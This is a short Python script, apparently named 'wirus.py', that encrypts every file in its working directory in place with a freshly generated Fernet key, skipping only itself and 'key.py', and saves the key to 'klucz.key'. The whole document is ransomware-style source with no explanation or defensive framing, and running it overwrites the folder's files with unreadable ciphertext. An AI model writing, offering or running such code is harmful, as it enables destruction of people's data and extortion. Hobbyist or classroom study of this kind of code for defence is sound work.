import os 
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "wirus.py" or file == "key.py":
        continue
    if os.path.isfile(file):
        files.append(file)
    
print(file)

key = Fernet.generate_key()

print(key)

with open("klucz.key", "wb") as klucz: 
    klucz.write(key)

for file in files:
    with open(file, "rb") as pliczki:
        contents = pliczki.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as pliczki:
        pliczki.write(contents_encrypted)